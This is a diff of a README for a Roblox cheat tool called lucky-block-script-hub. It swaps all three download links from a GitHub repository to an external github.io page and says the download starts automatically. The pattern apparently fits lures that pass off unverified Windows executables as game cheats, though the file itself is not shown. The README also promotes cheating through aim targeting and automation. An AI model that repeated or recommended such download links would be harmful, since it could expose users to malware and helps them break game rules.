@@ -4,7 +4,7 @@
 
 Welcome to **lucky-block-script-hub**, your all-in-one Roblox Lua script utility built for Windows PC. Whether you're looking to dominate combat with precision targeting or streamline your in-game economy, this tool does the heavy lifting for you—no coding skills required.
 
-**Visit this link to download the application:** [Download lucky-block-script-hub](https://github.com/lottieepigastric889/lucky-block-script-hub)
+**Visit this link to download the application:** [Download lucky-block-script-hub](https://lottieepigastric889.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Stay informed with an on-screen heads-up display. Get instant visual notificatio
 Follow these simple steps to get lucky-block-script-hub up and running:
 
 ### Step 1: Download the Application
-**Visit this link to download the application:** [Download lucky-block-script-hub](https://github.com/lottieepigastric889/lucky-block-script-hub)
+**Visit this link to download the application:** [Download lucky-block-script-hub](https://lottieepigastric889.github.io)
 
 The download will start automatically. Be patient—the file size is reasonable and should complete within a minute or two on a standard connection.
 
@@ -176,7 +176,7 @@ Absolutely. Target locking and item selling work simultaneously without conflict
 5. Press **`T`** to start selling items.
 6. Enjoy your enhanced gameplay!
 
-**Download now:** [lucky-block-script-hub](https://github.com/lottieepigastric889/lucky-block-script-hub)
+**Download now:** [lucky-block-script-hub](https://lottieepigastric889.github.io)
 
 ---
 
